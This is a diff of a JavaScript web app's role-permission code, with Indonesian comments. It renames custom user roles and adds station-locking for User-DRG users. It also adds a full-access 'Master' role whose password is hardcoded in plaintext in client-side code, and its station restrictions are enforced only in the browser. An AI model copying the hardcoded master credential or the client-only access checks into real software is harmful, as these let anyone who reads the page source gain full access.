-    { id:'tab-drygoods-dashboard', label:'📊 Drygoods – Dashboard',  def:{coAdmin:true, user:true,  peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-drygoods-ifs',       label:'🏢 Drygoods – IFS Station',def:{coAdmin:true, user:true,  peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'tab-drygoods-bankitem',  label:'🗂️ Drygoods – Bank Item',  def:{coAdmin:true, user:false, peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'feat-import',    label:'⬆️ Fitur Import Data',    def:{coAdmin:true, user:false, peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'feat-delete',    label:'🗑️ Fitur Hapus Data',     def:{coAdmin:true, user:false, peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
-    { id:'feat-edit',      label:'✏️ Fitur Edit Data',      def:{coAdmin:true, user:false, peserta:false, userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
+    { id:'tab-home',       label:'🏠 Tab Home',            def:{coAdmin:true, user:true,  peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-input',      label:'✈️ Tab Input',            def:{coAdmin:true, user:true,  peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-data',       label:'📊 Tab Data',             def:{coAdmin:true, user:true,  peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-dashboard',  label:'📈 Tab Dashboard',        def:{coAdmin:true, user:true,  peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-request',    label:'📝 Tab Approval',         def:{coAdmin:true, user:false, peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-stations',   label:'🗺️ Tab Station',          def:{coAdmin:true, user:false, peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-dfs',        label:'🗂️ Tab DFS Bank',         def:{coAdmin:true, user:false, peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-materi',     label:'📚 Tab Materi Training',  def:{coAdmin:true, user:false, peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-soal',       label:'📝 Tab Soal Training',    def:{coAdmin:true, user:true,  peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-sertifikat', label:'🎓 Tab Sertifikat',       def:{coAdmin:true, user:false, peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-admin',      label:'👥 Tab Admin/User Mgmt',  def:{coAdmin:true, user:false, peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-settings',   label:'⚙️ Tab Settings',         def:{coAdmin:true, user:false, peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-stcr-dashboard', label:'🏥 STCR – Dashboard',    def:{coAdmin:true, user:true,  peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-stcr-data',      label:'📋 STCR – Data Request', def:{coAdmin:true, user:true,  peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-stcr-station',   label:'📍 STCR – Station',      def:{coAdmin:true, user:false, peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-drygoods-data',      label:'📦 Drygoods – Data Stok',  def:{coAdmin:true, user:true,  peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-drygoods-dashboard', label:'📊 Drygoods – Dashboard',  def:{coAdmin:true, user:true,  peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-drygoods-ifs',       label:'🏢 Drygoods – IFS Station',def:{coAdmin:true, user:true,  peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'tab-drygoods-bankitem',  label:'🗂️ Drygoods – Bank Item',  def:{coAdmin:true, user:false, peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'feat-import',    label:'⬆️ Fitur Import Data',    def:{coAdmin:true, user:false, peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'feat-delete',    label:'🗑️ Fitur Hapus Data',     def:{coAdmin:true, user:false, peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
+    { id:'feat-edit',      label:'✏️ Fitur Edit Data',      def:{coAdmin:true, user:false, peserta:false, userall:false, usersr:false, userstcr:false, userst:false, userdrg:false} },
     { id:'feat-mulai',     label:'🚀 Mulai Training Peserta',def:{coAdmin:true, user:true,  peserta:true,  userxxx:false, userxx:false, userx:false, usermmm:false, usermm:false, userm:false} },
   ];
 
   // Daftar role kustom non-bawaan (selain Admin/Co-Admin/User/Peserta).
   // Tambahkan di sini jika suatu saat ingin menambah role baru lagi.
+  // *** MASTER password hash adalah SHA-256 dari 'Nu55y294gpx' ***
+  // Master role: akses ke semua, diikat ke sistem dengan password khusus
+  const MASTER_PASSWORD_PLAIN = 'Nu55y294gpx'; // disimpan plain hanya untuk validasi local fallback
   const CUSTOM_ROLES = [
-    { key:'userxxx', label:'UserXXX', roleName:'UserXXX', accent:'accent-rose-600',    badgeClass:'bg-rose-100 text-rose-700',     headerTextClass:'text-rose-700 dark:text-rose-300' },
-    { key:'userxx',  label:'UserXX',  roleName:'UserXX',  accent:'accent-amber-600',   badgeClass:'bg-amber-100 text-amber-700',   headerTextClass:'text-amber-700 dark:text-amber-300' },
-    { key:'userx',   label:'UserX',   roleName:'UserX',   accent:'accent-teal-600',    badgeClass:'bg-teal-100 text-teal-700',     headerTextClass:'text-teal-700 dark:text-teal-300' },
-    { key:'usermmm', label:'UserMMM', roleName:'UserMMM', accent:'accent-violet-600',  badgeClass:'bg-violet-100 text-violet-700', headerTextClass:'text-violet-700 dark:text-violet-300' },
-    { key:'usermm',  label:'UserMM',  roleName:'UserMM',  accent:'accent-cyan-600',    badgeClass:'bg-cyan-100 text-cyan-700',     headerTextClass:'text-cyan-700 dark:text-cyan-300' },
-    { key:'userm',   label:'UserM',   roleName:'UserM',   accent:'accent-orange-600',  badgeClass:'bg-orange-100 text-orange-700', headerTextClass:'text-orange-700 dark:text-orange-300' },
+    { key:'userall',  label:'User-All',  roleName:'User-All',  accent:'accent-emerald-600', badgeClass:'bg-emerald-100 text-emerald-700', headerTextClass:'text-emerald-700 dark:text-emerald-300' },
+    { key:'usersr',   label:'User-SR',   roleName:'User-SR',   accent:'accent-blue-600',    badgeClass:'bg-blue-100 text-blue-700',       headerTextClass:'text-blue-700 dark:text-blue-300' },
+    { key:'userstcr', label:'User-STCR', roleName:'User-STCR', accent:'accent-purple-600',  badgeClass:'bg-purple-100 text-purple-700',   headerTextClass:'text-purple-700 dark:text-purple-300' },
+    { key:'userst',   label:'User-ST',   roleName:'User-ST',   accent:'accent-teal-600',    badgeClass:'bg-teal-100 text-teal-700',       headerTextClass:'text-teal-700 dark:text-teal-300' },
+    { key:'userdrg',  label:'User-DRG',  roleName:'User-DRG',  accent:'accent-orange-600',  badgeClass:'bg-orange-100 text-orange-700',   headerTextClass:'text-orange-700 dark:text-orange-300' },
   ];
   window.CUSTOM_ROLES = CUSTOM_ROLES;
   // Semua role yang valid dalam sistem (dipakai untuk validasi di banyak tempat)
-  window.ALL_ROLES = ['Admin','Co-Admin','User','Peserta', ...CUSTOM_ROLES.map(r=>r.roleName)];
+  window.ALL_ROLES = ['Master','Admin','Co-Admin','User','Peserta', ...CUSTOM_ROLES.map(r=>r.roleName)];
   // Mapping nama role (persis seperti disimpan di user object) -> roleKey di tabel perms
   window.roleNameToKey = function(roleName){
+    if(roleName === 'Master') return 'master'; // Master = akses penuh seperti Admin
     if(roleName === 'Co-Admin') return 'coAdmin';
     if(roleName === 'User') return 'user';
     if(roleName === 'Peserta') return 'peserta';
@@ -12108,6 +12304,9 @@ _updateOfflineQueueBadge(); // cek langsung saat load
         </td>`).join('');
       return `<tr class="hover:bg-slate-50 dark:hover:bg-slate-800/50">
         <td class="p-3 font-medium">${f.label}</td>
+        <td class="p-3 text-center" title="Master selalu punya akses penuh">
+          <input type="checkbox" checked disabled class="w-4 h-4 accent-yellow-500 opacity-70" title="Master: akses penuh (tidak dapat diubah)">
+        </td>
         <td class="p-3 text-center">
           <input type="checkbox" data-feat="${f.id}" data-role="coAdmin" ${p.coAdmin?'checked':''} class="perm-chk w-4 h-4 accent-blue-600" ${isViewerAdmin?'':'disabled'}>
         </td>
@@ -14594,6 +14793,30 @@ const STCR_SEED_DATA = [{"Date of Request": "", "Date of Flight": "2024-01-03", 
       nb.textContent = '＋ Station';
       container.appendChild(nb);
     }
+    // *** User-DRG: lock station tabs ke station karyawan ***
+    const _cu = window.currentUser;
+    if(_cu && _cu.role === 'User-DRG'){
+      const _drgSt = window._userDrgStation;
+      container.querySelectorAll('[data-dg-station]').forEach(function(tab){
+        const st = tab.dataset.dgStation;
+        if(st && st !== 'ALL' && st !== _drgSt){
+          tab.style.opacity = '0.3';
+          tab.style.pointerEvents = 'none';
+          tab.title = 'Akses terbatas — hanya station ' + (_drgSt || 'Anda');
+        } else {
+          tab.style.opacity = '';
+          tab.style.pointerEvents = '';
+          tab.title = '';
+        }
+      });
+      // Hide "Semua" tab for DRG users too (they should only see their station)
+      const allTab = container.querySelector('[data-dg-station="ALL"]');
+      if(allTab){
+        allTab.style.opacity = '0.3';
+        allTab.style.pointerEvents = 'none';
+        allTab.title = 'Akses terbatas';
+      }
+    }
     // Wire station filter select
     const sel = document.getElementById('dgActiveStation');
     if(sel){
@@ -15188,6 +15411,18 @@ const STCR_SEED_DATA = [{"Date of Request": "", "Date of Flight": "2024-01-03", 
 
   // Station tabs click
   document.getElementById('dgStationTabs')?.addEventListener('click', e=>{
+    // User-DRG: hanya boleh akses station mereka sendiri
+    const cu = window.currentUser;
+    if(cu && cu.role === 'User-DRG'){
+      const targetSt = e.target.closest('[data-dg-station]')?.dataset.dgStation;
+      if(targetSt){
+        const allowedSt = window._userDrgStation || 'ALL';
+        if(targetSt !== allowedSt && targetSt !== cu.station){
+          showToast('Akses terbatas: Anda hanya dapat melihat station ' + (allowedSt || 'yang ditugaskan'), 'error');
+          return; // block switching to other station
+        }
+      }
+    }
     const st = e.target.closest('[data-dg-station]')?.dataset.dgStation;
     if(!st) return;
     activeDgStation = st;
